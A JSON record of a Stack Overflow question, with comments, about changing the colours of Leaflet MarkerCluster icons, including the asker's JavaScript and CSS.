9545114, "user_type": "registered", "profile_image": "https://graph.facebook.com/1743097285713685/picture?type=large", "display_name": "Max Michel", "link": "https://stackoverflow.com/users/9545114/max-michel"}, "reply_to_user": {"reputation": 34057, "user_id": 5108796, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf3d4505d0473b230f8b413248f7439f?s=128&d=identicon&r=PG&f=1", "display_name": "ghybs", "link": "https://stackoverflow.com/users/5108796/ghybs"}, "edited": false, "score": 0, "creation_date": 1558610038, "post_id": 56263876, "comment_id": 99162512, "body": "@ghybs I have nothing different than what is up there which is my issue. I don&#39;t understand why it works with Joffrey but not me..."}, {"owner": {"reputation": 34057, "user_id": 5108796, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf3d4505d0473b230f8b413248f7439f?s=128&d=identicon&r=PG&f=1", "display_name": "ghybs", "link": "https://stackoverflow.com/users/5108796/ghybs"}, "edited": false, "score": 2, "creation_date": 1558615443, "post_id": 56263876, "comment_id": 99165415, "body": "If you could reproduce your issue (e.g. in <a href=\"https://leafletjs.com/edit\" rel=\"nofollow noreferrer\">leafletjs.com/edit</a>), that would tremendously help."}, {"owner": {"reputation": 403, "user_id": 9545114, "user_type": "registered", "profile_image": "https://graph.facebook.com/1743097285713685/picture?type=large", "display_name": "Max Michel", "link": "https://stackoverflow.com/users/9545114/max-michel"}, "reply_to_user": {"reputation": 34057, "user_id": 5108796, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf3d4505d0473b230f8b413248f7439f?s=128&d=identicon&r=PG&f=1", "display_name": "ghybs", "link": "https://stackoverflow.com/users/5108796/ghybs"}, "edited": false, "score": 1, "creation_date": 1559143090, "post_id": 56263876, "comment_id": 99330769, "body": "I haven&#39;t been able to reproduce it which leads me to believe that the issue is more complex than I initially thought. I&#39;ll keep trying and update this question when I manage to do so. Thank you @ghybs"}], "owner": {"reputation": 403, "user_id": 9545114, "user_type": "registered", "profile_image": "https://graph.facebook.com/1743097285713685/picture?type=large", "display_name": "Max Michel", "link": "https://stackoverflow.com/users/9545114/max-michel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 403, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1558554111, "creation_date": 1558554111, "question_id": 56263876, "link": "https://stackoverflow.com/questions/56263876/how-to-change-markercluster-icon-colour-but-keep-the-original-icon-design", "title": "How to change MarkerCluster icon colour but keep the original icon design", "body": "<p>I have a large web project with an interactive map where everything works fine. The final elements to do are styling and I would like to simply (or so I thought it was) change the colour of the default ClusterMarker. I really like the aesthetic of the circles with the number of elements in the cluster over it but would like to have 8/9 different colours, not the default 3 (green, yellow and red).</p>\n\n<p>I've tried following numerous stackoverflow answers and the documentation but none of the answers work.</p>\n\n<p>Below is what I currently have:</p>\n\n<pre><code>var markersEU = new L.MarkerClusterGroup({\n    showCoverageOnHover: false,\n    iconCreateFunction: function(cluster) {\n        var t = cluster.getChildCount();\n        return new L.divIcon(\n            {\n                html: \"&lt;div&gt;&lt;span&gt;\" + t + \"&lt;/span&gt;&lt;/div&gt;\",\n                className: \"leaflet-marker-icon marker-cluster marker-cluster-eu leaflet-zoom-animated leaflet-interactive\",\n                iconSize: new L.Point(40, 40)\n            }\n        );\n    }\n});\n</code></pre>\n\n<p>And here is the <code>MarkerCluster.Default.css</code> file</p>\n\n<pre><code>.marker-cluster-small {\n    background-color: rgba(181, 226, 140, 0.6);\n    }\n.marker-cluster-small div {\n    background-color: rgba(110, 204, 57, 0.6);\n    }\n\n.marker-cluster-medium {\n    background-color: rgba(241, 211, 87, 0.6);\n    }\n.marker-cluster-medium div {\n    background-color: rgba(240, 194, 12, 0.6);\n    }\n\n.marker-cluster-large {\n    background-color: rgba(253, 156, 115, 0.6);\n    }\n.marker-cluster-large div {\n    background-color: rgba(241, 128, 23, 0.6);\n    }\n\n.marker-cluster-eu {\n    background-color: rgba(74, 74, 206, 0.6);\n    }\n.marker-cluster-eu div{\n    background-color: rgba(35, 35, 200, 0.6);\n    }\n\n    /* IE 6-8 fallback colors */\n.leaflet-oldie .marker-cluster-small {\n    background-color: rgb(181, 226, 140);\n    }\n.leaflet-oldie .marker-cluster-small div {\n    background-color: rgb(110, 204, 57);\n    }\n\n.leaflet-oldie .marker-cluster-medium {\n    background-color: rgb(241, 211, 87);\n    }\n.leaflet-oldie .marker-cluster-medium div {\n    background-color: rgb(240, 194, 12);\n    }\n\n.leaflet-oldie .marker-cluster-large {\n    background-color: rgb(253, 156, 115);\n    }\n.leaflet-oldie .marker-cluster-large div {\n    background-color: rgb(241, 128, 23);\n}\n\n.leaflet-oldie .marker-cluster-eu {\n    background-color: rgb(74, 74, 206);\n    }\n.leaflet-oldie .marker-cluster-eu div{\n    background-color: rgb(35, 35, 200);\n}\n\n.marker-cluster {\n    background-clip: padding-box;\n    border-radius: 20px;\n    }\n.marker-cluster div {\n    width: 30px;\n    height: 30px;\n    margin-left: 5px;\n    margin-top: 5px;\n\n    text-align: center;\n    border-radius: 15px;\n    font: 12px \"Helvetica Neue\", Arial, Helvetica, sans-serif;\n    }\n.marker-cluster span {\n    line-height: 30px;\n    }\n</code></pre>\n\n<p>As you can see, I haven't changed anything in the default styling other than added my own <code>marker-cluster-eu</code> styling.</p>\n\n<p>Here is the github where everything is (if it helps find a solution): <a href=\"https://github.com/MaxMichel2/PWEB\" rel=\"nofollow noreferrer\">https://github.com/MaxMichel2/PWEB</a></p>\n\n<p>To make things perfectly clear, I would like to keep EVERYTHING default about the clusters and their aesthetics and ONLY change the colour.</p>\n\n<p>Thanks in advance!</p>\n"}]